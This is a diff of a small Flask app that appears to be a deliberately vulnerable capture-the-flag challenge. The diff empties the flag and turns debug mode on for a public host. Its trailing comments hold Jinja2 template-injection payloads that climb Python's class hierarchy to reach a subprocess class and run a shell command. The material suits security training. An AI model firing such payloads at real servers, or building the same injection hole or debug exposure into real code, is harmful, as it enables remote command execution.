@@ -2,11 +2,7 @@ from flask import Flask,request,render_template_string
 from urllib.parse import unquote
 
 app = Flask(__name__)
-
-with open('flag.txt', 'r') as f:
-	flag = f.read()
-    
-app.secret_key=str(flag)
+flag = ''
 
 @app.route("/")
 def main_page():
@@ -19,9 +15,9 @@ def page_not_found(error):
 
 
 if __name__ == '__main__': 
-    app.run(debug = False, host = '0.0.0.0')
+    app.run(debug = True, host = '0.0.0.0')
 
 
 #{{ ''.__class__.__mro__[1].__subclasses__() }}
 #{{ ''.__class__.__mro__[1].__subclasses__()[236] }}
-#{{''.__class__.__mro__[1].__subclasses__()[236]('ls -al',shell=True,stdout=-1).communicate()}}
+#{{''.__class__.__mro__[1].__subclasses__()[464]('ls -al',shell=True,stdout=-1).communicate()}}
